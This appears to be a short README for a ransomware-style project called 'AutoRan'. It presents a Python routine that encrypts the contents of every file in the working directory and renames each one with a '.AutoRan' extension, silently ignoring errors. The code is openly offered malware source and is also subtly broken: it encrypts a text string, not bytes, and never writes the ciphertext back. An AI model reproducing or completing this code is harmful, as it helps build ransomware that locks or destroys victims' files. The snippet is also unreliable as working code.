# AutoRan
### AutoRan history 1.0
 - Encrypt

##### Use cryptography modul
##### Encrypt Source Code

```
Files = glob.glob("*.*")

def Encry():
  try:
    for File in Files:
      with open(File, "r") as fp:
        Data = fp.read()
        Locked = F.encrypt(Data)
        Encrypt[File] = Locked
        os.rename(File, f"{File}.AutoRan")
        FL.insert(END, f"{File} -> {File}.AutoRan")
        fp.close()
  except:
    pass
```
